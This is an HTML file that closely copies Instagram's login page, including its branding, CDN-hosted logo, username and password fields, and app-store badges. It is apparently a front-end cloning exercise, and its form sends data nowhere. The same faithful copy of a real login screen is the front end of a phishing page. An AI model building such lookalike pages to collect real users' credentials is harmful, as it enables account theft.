<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="shortcut icon" href="instafavIcon.png">
    <link href="style.css" rel="stylesheet">
</head>
<body>
    <div class="main">
    <div class="container">
        <div class="box">
            <div aria-disabled="false" role="button" tabindex="0" style="cursor: pointer;">
                <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
            </div>
            <form  class="login-form">
                <div class="field">
                    <input id="username"  type="name" placeholder="...">
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field">
                    <input id="password"  type="password" placeholder="...">
                    <label for="password">Password</label>
                </div>
                <button class="login-button" title="login">Log in</button>
                <div class="separator">
                    <span class="line"></span>
                    <p>OR</p>
                    <span class="line"></span>
                </div>
                <div class="other">
                    <button class="fb-login-btn">
                        <i class="fa-icon"><img src="facebook-icon.png" alt="facebook" width="20px" height="20px"></i>
                        <span class="">Login with Facebook</span>
                    </button>
                    <a class="forget-password" href="#">Forget password?</a>

                </div>
            </form> 
            </div>

           
        </div>
        <div class="box1">
            <p>Don't have an account?
                <a class="signup" href="#">Sign up</a>
            </p>
        </div>
        <div class="getapp">Get the app.</div>
        <div class="apps">
        <a aria-label="Get it on Google Play"  href="https://l.instagram.com/?u=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.instagram.android%26referrer%3Dig_mid%253D467E7087-25F1-41F0-B32C-5D322D227229%2526utm_campaign%253DloginPage%2526utm_content%253Dlo%2526utm_source%253Dinstagramweb%2526utm_medium%253Dbadge&amp;e=AT0xSAxbClLJF9Ld7sciEdQ-eJveZ7on0Y1xGGIFW8ZCrFEWHXvb-r7etueF2Rq8GvPVrp0r9jutJ-XFBFtJB3eeUDeS3Cp60oxuqBwBCU-Rgdnqfxnbe2Zn_PxnALTKpBb_ysElSWaBxZ5pFksEUcRA19jkHLu6PKWJWA" rel="nofollow noreferrer" role="link" tabindex="0" target="_blank"><img alt="Get it on Google Play" class="_aa5q" src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" width="150px" height="40px"></a>
        <a aria-label="Get it from Microsoft"  href="ms-windows-store://pdp/?productid=9nblggh5l9xt&amp;referrer=appbadge&amp;source=www.instagram.com&amp;mode=mini&amp;pos=1068%2C0%2C860%2C1028" rel="nofollow noreferrer" role="link" tabindex="0" target="_blank"><img alt="Get it from Microsoft" class="_aa5q" src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png " width="140px" height="40px"></a>
    </div>
    
    </div>
</div>
    
</body>
</html>
